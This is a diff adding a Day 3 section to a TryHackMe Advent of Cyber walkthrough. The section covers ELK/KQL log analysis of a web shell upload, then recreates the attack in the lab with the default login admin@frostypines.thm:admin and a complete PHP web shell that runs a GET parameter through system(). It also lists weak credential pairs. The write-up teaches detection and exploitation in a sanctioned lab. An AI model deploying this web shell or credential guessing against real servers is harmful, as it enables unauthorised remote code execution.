@@ -6,10 +6,11 @@ Dive into the wonderful world of cyber security by engaging in festive beginner-
 * Difficulty: Easy
 * Category: Advent of Cyber
 
-## Summary
+## Table of Contents
 
 * [[OPSEC] Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?](#opsec-day-1-maybe-soc-mas-music-he-thought-doesnt-come-from-a-store)
 * [[Log Analysis] Day 2: One man's false positive is another man's potpourri](#log-analysis-day-2-one-mans-false-positive-is-another-mans-potpourri)
+* [[Log Analysis] Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it](#log-analysis-day-3-even-if-i-wanted-to-go-their-vulnerabilities-wouldnt-allow-it)
 
 ## [OPSEC] Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?
 
@@ -390,3 +391,205 @@ As we have Glitch's IP address, we can filter for the successful logon events fr
 5. What is the decoded command executed by Glitch to fix the systems of Wareville?
 
 We decoded the command earlier.
+
+## [Log Analysis] Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it
+
+### The Story
+
+*Late one Christmas evening the Glitch had a feeling,*  
+*Something forgotten as he stared at the ceiling.*  
+*He got up out of bed and decided to check,*  
+*A note on his wall: ”Two days! InsnowSec”.*
+
+*With a click and a type he got his hotel and tickets,*  
+*And sank off to sleep to the sound of some crickets.*  
+*Luggage in hand, he had arrived at Frosty Pines,*  
+*“To get to the conference, just follow the signs”.*
+
+*Just as he was ready the Glitch got a fright,*  
+*An RCE vulnerability on their website ?!?*  
+*He exploited it quick and made a report,*  
+*But before he could send arrived his transport.*
+
+*In the Frosty Pines SOC they saw an alert,*  
+*This looked quite bad, they called an expert.*  
+*The request came from a room, but they couldn’t tell which,*  
+*The logs saved the day, it was the room of... the Glitch.*
+
+In this task, we will cover how the SOC team and their expert were able to find out what had happened (Operation Blue) and how the Glitch was able to gain access to the website in the first place (Operation Red).
+
+### Learning Objectives
+
+* Learn about Log analysis and tools like ELK.
+* Learn about KQL and how it can be used to investigate logs using ELK.
+* Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.
+
+### OPERTATION BLUE
+
+#### Log Analysis and ELK
+
+Analysing logs can quickly become overwhelming, especially if we have multiple devices and services. ELK, or Elasticsearch, Logstash, and Kibana, combines data analytics and processing tools to make analysing logs much more manageable. ELK forms a dedicated stack that can aggregate logs from multiple sources into one central place.
+
+#### Kibana Query Language (KQL)
+
+KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If we are working with Splunk, we may be thinking of SPL (Search Processing Language).
+
+Alternatively, Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc. The table below contains a mini-cheatsheet for KQL syntax.
+
+| **Query/Syntax** | **Description**                                                                                      | **Example**                   |
+| ---------------- | ---------------------------------------------------------------------------------------------------- | ----------------------------- |
+| ""               | Search for an exact match                                                                            | "TryHackMe"                   |
+| *                | The asterisk denotes a wildcard, which searches documents for similar matches to the value provided. | United*                       |
+| OR               | This logical operator is used to show documents that contain either of the values provided.          | "United Kingdom" OR "England" |
+| AND              | This logical operator is used to show documents that contain both values.                            | "Ben" and "25"                |
+| :                | This is used to search the (specified) field of a document for a value                               | ip.address: 10.10.10.10       |
+
+#### Investigating Web Attack with ELK
+
+**Scenario:** Thanks to our extensive intrusion detection capabilities, our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this.
+
+Steps to investigate:
+1. Go to **Discover** in Kibana.
+2. Set the time range.
+3. Apply suitable filters and analyse the logs.
+
+### OPERATION RED
+
+#### Why Do Websites Allow File Uploads
+
+File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren't handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.
+
+#### File Upload Vulnerabilities
+
+File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:
+* **RCE:** Uploading a script that the server runs gives the attacker control over it.
+* **XSS:** Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.
+
+#### Why Unrestricted File Uploads Are Dangerous
+
+Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.
+
+Examples of abuse through unrestricted file uploads include:
+* Uploading a script that the server executes, leading to RCE.
+* Uploading a crafted image file that triggers a vulnerability when processed by the server.
+* Uploading a web shell and browsing to it directly using a browser.
+
+#### Usage of Weak Credentials
+
+One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.
+
+Here are some common or weak credentials that attackers might try:
+* `admin:admin`
+* `administrator:administrator`
+* `admin@domainname:admin`
+* `guest:guest`
+
+#### What is Remote Code Execution (RCE)
+
+Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
+
+#### What is a Web Shell
+
+A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.
+
+For example, attackers could use a web shell to:
+* Execute commands on the server
+* Move laterally within the network
+* Download sensitive data or pivot to other services
+
+A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.
+
+#### Exploiting RCE via File Upload
+
+Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
+
+#### Making the most of it
+
+Once the vulnerability has been exploited and we now have access to the operating system via a web shell, there are many next steps we could take depending on:
+1. What our goal is
+2. What misconfigurations are present on the system, which will determine exactly what we can do.
+
+These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what we can do will rely on our abilities to inspect an environment and vulnerabilities in the system itself.
+
+### Practical
+
+We will be answering questions while solving the challenge. First, we need to access Kibana on `<MACHINE_IP>:5601` to investigate the logs.
+
+![](day_3-kibana-home.png)
+
+As we arrive at the Kibana home page, we continue to the **Discover** tab to investigate the logs.
+
+![](day_3-discover.png)
+
+We haven't seen any logs yet but okay. We set the index pattern to `frostypines-resorts` and the time range to between 11:30 and 12:00 on Oct 3rd, 2024 as given in the challenge.
+
+![](day_3-initial-setup.png)
+
+We can see that there are 483 hits in the logs. As we take a look at the `clientip` field, we can see that there are 2 main IP addresses: `10.9.254.186` and `10.11.83.34`. Let's first take a look at the logs of `10.9.254.186`.
+
+![](day_3-ip-10-9-254-186.png)
+
+There are 314 hits for this IP address. After some extensive scrolling, it seems that all the logs are legitimate activities. Let's now take a look at the logs of `10.11.83.34`.
+
+![](day_3-ip-10-11-83-34.png)
+
+After just a few scrolls, we can set requests to a file named `shell.php` with `command` parameter set to various commands such as `ls`, `id`, `echo`, etc. This is an indication of a web shell uploaded to the website.
+
+> **BLUE:** Where was the web shell uploaded to?  
+> **Answer format:** `/directory/directory/directory/filename.php`
+> Answer hint: Look at the `request` field in the logs.
+
+> **BLUE:** What IP address accessed the web shell?
+> **Answer:** `10.11.83.34`
+
+Now that we know what happened, we need to recreate the attack to confirm the vulnerability. We will go to the website via the link provided.
+
+![](day_3-website-home.png)
+
+We found a login page. We can try default credentials such as `admin@frostypines.thm:admin` to see if we can log in.
+
+![](day_3-admin-login.png)
+
+It worked! And we also see an admin panel. Let's check it out.
+
+![](day_3-admin-panel.png)
+
+There is an `Add new room` section. Time to check it out.
+
+![](day_3-add-room-panel.png)
+
+Now we upload our webshell. We can use the webshell provided in the challenge.
+
+```html
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
+We save this as `webshell.php` and upload it. Then we go to the `webshell.php` file to see if it works.
+
+![](day_3-webshell.png)
+
+Sounds like it does! Let's try running some commands.
+
+![](day_3-id.png)
+
+Seems like we have RCE. And we even have sudo privileges. Let's check the files around us.
+
+![](day_3-ls.png)
+
+> **RED:** What is the contents of the flag.txt?
+> We have seen the `flag.txt` file in the previous `ls` command. Check the contents with `cat` and we have the flag.
